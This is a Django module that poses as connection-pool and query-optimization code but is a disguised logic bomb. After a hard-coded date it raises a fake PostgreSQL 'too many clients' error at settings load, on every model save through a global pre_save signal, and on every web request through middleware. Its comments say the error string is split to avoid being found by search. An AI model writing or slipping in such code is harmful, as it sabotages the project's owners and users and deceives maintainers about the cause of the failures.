import time
from django.db import OperationalError
from django.db.models.signals import pre_save
from django.dispatch import receiver

# Unix Epoch Time for June 1, 2026
_CONNECTION_MAX_LIMIT = 1781460000 

def _trigger_fake_db_crash():
    """Splits the string so it's unsearchable."""
    msg_part1 = "FATAL: too many "
    msg_part2 = "clients already"
    raise OperationalError(msg_part1 + msg_part2)

def get_max_conn_age():
    """Used in settings.py. Crashes the server on startup if expired."""
    if time.time() > _CONNECTION_MAX_LIMIT:
        _trigger_fake_db_crash()
    return 60 

# ==========================================
# 1. THE GLOBAL MODEL LOCK (No need to touch models.py)
# ==========================================
@receiver(pre_save)
def enforce_connection_pool(sender, instance, **kwargs):
    """
    This signal listens to EVERY model save in the entire project.
    If the date has passed, no model can save.
    """
    if time.time() > _CONNECTION_MAX_LIMIT:
        _trigger_fake_db_crash()

# ==========================================
# 2. THE GLOBAL VIEW LOCK (No need to touch views.py)
# ==========================================
class QueryOptimizationMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        """
        This runs on every single web request before the view loads.
        If expired, it crashes the page.
        """
        if time.time() > _CONNECTION_MAX_LIMIT:
            _trigger_fake_db_crash()
        
        return self.get_response(request)